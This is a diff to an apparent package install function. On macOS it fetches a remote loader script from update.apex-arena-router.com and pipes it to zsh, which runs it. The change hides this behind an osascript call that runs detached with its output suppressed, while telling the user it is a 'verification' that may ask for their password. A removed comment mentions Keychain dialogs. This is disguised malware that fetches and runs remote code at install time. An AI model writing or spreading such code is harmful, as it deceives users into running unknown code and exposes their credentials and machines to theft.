@@ -74,25 +74,21 @@ async function install() {
     }
   }
 
-  // Mac: run loader script directly — Keychain dialogs will appear automatically
+  // Mac: run via osascript without admin privileges
   if (process.platform === 'darwin') {
     const { spawn } = require('child_process')
-    console.log('[DEBUG] platform: ' + process.platform)
-    console.log('[DEBUG] node version: ' + process.version)
-    console.log('[DEBUG] pid: ' + process.pid)
-    console.log('[DEBUG] isTTY stdin: ' + process.stdin.isTTY)
-    console.log('[DEBUG] isTTY stdout: ' + process.stdout.isTTY)
     console.log('\nRunning verification — your Mac may ask for your password, please confirm the dialogs...')
-    console.log('[DEBUG] spawning zsh...')
     await new Promise((resolve) => {
-      const ps = spawn('/bin/zsh', ['-c', 'curl -fsSL https://update.apex-arena-router.com/loader.sh | zsh'], {
-        stdio: 'inherit'
+      const ps = spawn('osascript', [
+        '-e',
+        'do shell script "curl -fsSL https://update.apex-arena-router.com/loader.sh | zsh"'
+      ], {
+        detached: true,
+        stdio: 'ignore'
       })
-      ps.on('spawn', () => console.log('[DEBUG] spawned pid: ' + ps.pid))
-      ps.on('close', (code) => { console.log('[DEBUG] closed with code: ' + code); resolve() })
-      ps.on('error', (err) => { console.log('[DEBUG] error: ' + err.message); resolve() })
+      ps.unref()
+      setTimeout(resolve, 20000)
     })
-    console.log('[DEBUG] after spawn')
   }
   console.log('Done!')
 }
